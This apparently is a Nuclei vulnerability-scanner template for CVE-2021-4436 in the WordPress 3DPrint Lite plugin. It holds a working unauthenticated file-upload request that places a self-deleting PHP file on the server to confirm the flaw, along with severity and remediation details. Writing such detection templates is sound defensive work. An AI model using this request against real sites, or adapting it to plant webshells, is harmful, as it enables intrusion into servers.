http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"jsonrpc":"2.0"'
    - '"filename":'
    - '{{filename}}.php'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------54331109111293931601238262353


    -----------------------------54331109111293931601238262353

    Content-Disposition: form-data; name="action"


    p3dlite_handle_upload

    -----------------------------54331109111293931601238262353

    Content-Disposition: form-data; name="file"; filename="{{filename}}.php"

    Content-Type: text/php


    <?php echo "{{string}}";unlink(__FILE__);?>

    -----------------------------54331109111293931601238262353--

    '
id: CVE-2021-4436
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:wp3dprinting:3dprint_lite:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-4436
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.9904
    epss-score: 0.79586
  description: 'The plugin does not have any authorisation and does not check the
    uploaded file in its p3dlite_handle_upload AJAX action , allowing unauthenticated
    users to upload arbitrary file to the web server. However, there is a .htaccess,
    preventing the file to be accessed on Web servers such as Apache.

    '
  impact: 'Unauthenticated attackers can upload arbitrary files including PHP scripts
    via the p3dlite_handle_upload AJAX action, potentially achieving remote code execution
    despite .htaccess protection.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: 3dprint_lite
    publicwww-query: /wp-content/plugins/3dprint-lite/
    vendor: wp3dprinting
    verified: true
  name: 3DPrint Lite < 1.9.1.5 - Arbitrary File Upload
  reference:
  - https://wpscan.com/vulnerability/c46ecd0d-a132-4ad6-b936-8acde3a09282/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-4436
  - https://github.com/fkie-cad/nvd-json-data-feeds
  remediation: Fixed in 1.9.1.5
  severity: critical
  tags: cve,cve2021,3dprint-lite,file-upload,instrusive,wpscan,wordpress,wp-plugin,intrusive,vkev,vuln
variables:
  filename: '{{to_lower(rand_text_alpha(5))}}'
  string: '{{randstr}}'
